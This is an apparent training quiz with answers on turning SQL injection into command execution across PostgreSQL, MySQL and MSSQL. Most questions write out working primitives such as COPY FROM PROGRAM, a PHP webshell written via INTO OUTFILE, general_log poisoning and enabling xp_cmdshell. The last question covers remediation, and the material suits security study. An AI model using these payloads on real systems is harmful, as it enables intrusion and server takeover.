# Domain 2 — Quiz 3: SQLi-to-RCE per Engine

> White-box scenarios. Answer before expanding.

---

**Q1.** You have stacked-query injection against PostgreSQL as a superuser. Which gives the most direct command execution?

- A. `COPY cmd(out text) FROM PROGRAM 'id';` then read the table.
- B. `SELECT LOAD_FILE('/bin/id');` to execute the binary.
- C. `EXEC xp_cmdshell 'id';` through the Postgres procedure.
- D. `SELECT INTO OUTFILE '/tmp/id';` to run the written file.

<details><summary>Show Answer & Explanation</summary>

**A.** `COPY ... FROM PROGRAM` runs a shell command as the server account — direct RCE in Postgres. `LOAD_FILE` (B) and `INTO OUTFILE` (D) are MySQL; `xp_cmdshell` (C) is MSSQL.
</details>

---

**Q2.** `COPY ... PROGRAM` is blocked for your Postgres role. Which alternative writes a UDF shared object to disk?

- A. Large objects: `lo_from_bytea`/`lo_put`/`lo_export` to write the `.so`, then `CREATE FUNCTION ... LANGUAGE C`.
- B. `general_log` redirection to the plugin directory.
- C. `sp_OACreate` to instantiate an OLE object that writes the file.
- D. `INTO DUMPFILE` to write the `.so` into the plugin directory.

<details><summary>Show Answer & Explanation</summary>

**A.** Postgres large objects write arbitrary bytes to disk, enabling a C UDF. `general_log` (B) and `INTO DUMPFILE` (D) are MySQL; `sp_OACreate` (C) is MSSQL.
</details>

---

**Q3.** MySQL injection with `FILE` privilege and a writable webroot. Fastest RCE?

- A. `... UNION SELECT '<?php system($_GET[0]);?>' INTO OUTFILE '/var/www/html/s.php'` then browse it.
- B. `COPY t FROM PROGRAM 'id'` to run a command.
- C. `CREATE ASSEMBLY` from a hex blob and call its procedure.
- D. `pg_read_file('/etc/passwd')` to pivot to the OS.

<details><summary>Show Answer & Explanation</summary>

**A.** `INTO OUTFILE` a webshell into the webroot is the direct MySQL path. `COPY PROGRAM` (B) and `pg_read_file` (D) are Postgres; `CREATE ASSEMBLY` (C) is MSSQL CLR.
</details>

---

**Q4.** MySQL has `FILE` but `secure_file_priv` points to a directory you cannot reach from the web. Alternative RCE primitive?

- A. Poison `general_log` by setting its file to a writable webroot path, then run a query containing PHP.
- B. Use `xp_cmdshell` since MySQL falls back to it automatically.
- C. Switch the engine to PostgreSQL mid-session to use `COPY PROGRAM`.
- D. Nothing is possible; `secure_file_priv` fully prevents all RCE.

<details><summary>Show Answer & Explanation</summary>

**A.** `SET GLOBAL general_log_file='/var/www/html/x.php'; SET GLOBAL general_log=ON;` then a query containing PHP writes executable content — an alternative when `INTO OUTFILE` is constrained (subject to privileges). `xp_cmdshell` (B) is MSSQL; you cannot change engines (C); `secure_file_priv` constrains `OUTFILE`, not necessarily log redirection (D).
</details>

---

**Q5.** MSSQL injection, high-priv login, `xp_cmdshell` disabled but you can reconfigure. Correct enable + execute?

- A. `sp_configure 'show advanced options',1; RECONFIGURE; sp_configure 'xp_cmdshell',1; RECONFIGURE; EXEC xp_cmdshell 'whoami';`
- B. `SET GLOBAL xp_cmdshell=ON; EXEC xp_cmdshell 'whoami';`
- C. `CREATE FUNCTION xp_cmdshell LANGUAGE C; SELECT xp_cmdshell('whoami');`
- D. `COPY t FROM PROGRAM 'whoami';`

<details><summary>Show Answer & Explanation</summary>

**A.** MSSQL gates `xp_cmdshell` behind `sp_configure` + `RECONFIGURE`. `SET GLOBAL` (B) is MySQL; `CREATE FUNCTION ... C` (C) is Postgres; `COPY PROGRAM` (D) is Postgres.
</details>

---

**Q6.** On MSSQL both `xp_cmdshell` and reconfigure are denied, but OLE automation is enabled. Path to execution?

- A. `sp_OACreate 'WScript.Shell'` then `sp_OAMethod` to run a command.
- B. `lo_export` the payload to disk and execute it.
- C. `INTO OUTFILE` a webshell into the IIS root.
- D. `pg_read_file` the SAM to extract credentials.

<details><summary>Show Answer & Explanation</summary>

**A.** OLE automation via `sp_OACreate`/`sp_OAMethod` instantiates `WScript.Shell` to run commands without `xp_cmdshell`. `lo_export`/`pg_read_file` (B, D) are Postgres; `INTO OUTFILE` (C) is MySQL.
</details>

---

**Q7.** You find a second-order SQLi: a username stored safely at registration is later concatenated into a reporting query. For the exploit, what must your script do?

- A. Register a username carrying the payload, then trigger the report request that executes the second query.
- B. Inject only at registration, since the stored value runs immediately.
- C. Attack the report query directly without registering, since storage is irrelevant.
- D. Drop the users table to confirm the injection impact.

<details><summary>Show Answer & Explanation</summary>

**A.** Second-order requires planting the payload (registration) then triggering the vulnerable consumer (report). Registration alone does not execute it (B); the report query reads *stored* data, so you must seed it first (C); dropping tables (D) is destructive and unnecessary.
</details>

---

**Q8.** Which remediation set correctly addresses all the engine-specific RCE paths in this quiz?

- A. Parameterise queries, run the app's DB account with least privilege, and disable PROGRAM/xp_cmdshell/OLE/untrusted CLR/FILE.
- B. Encrypt the database at rest so written files cannot be read.
- C. Rename the dangerous procedures so attackers cannot call them.
- D. Restrict the database to listen only on localhost, which prevents all SQLi-to-RCE.

<details><summary>Show Answer & Explanation</summary>

**A.** Stop the injection (parameterise) and remove the privileges/features that enable OS access (least privilege, disable PROGRAM/xp_cmdshell/OLE/CLR/FILE). Encryption at rest (B) does not stop RCE; renaming procedures (C) is obscurity; localhost binding (D) does not prevent injection through the app that reaches the DB.
</details>
